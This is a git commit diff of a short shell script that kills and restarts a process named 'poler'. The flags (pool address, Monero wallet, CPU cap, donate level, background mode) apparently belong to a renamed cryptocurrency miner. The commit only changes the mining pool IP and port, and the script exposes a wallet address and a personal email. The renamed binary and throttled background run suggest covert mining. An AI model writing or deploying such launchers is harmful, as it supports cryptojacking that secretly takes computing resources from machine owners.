dc82ca8473e0ac3cf6959152953187004d449a70
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-16 15:16:17 +0300

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,4 +1,4 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 109.234.36.174:5950 -u 452F3NnFWyHcjr9yfjVRH9jjYoz9fPr7eRNY6XjzPXQki9hsQxMNWZX1mX5fiSzmFRL4PyBuAGSa39tkMyD8pAM7H1x15C5 --pass=b1-pilot:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 62.113.238.161:5991 -u 452F3NnFWyHcjr9yfjVRH9jjYoz9fPr7eRNY6XjzPXQki9hsQxMNWZX1mX5fiSzmFRL4PyBuAGSa39tkMyD8pAM7H1x15C5 --pass=b1-pilot:robbertopp1@gmail.com -k
 
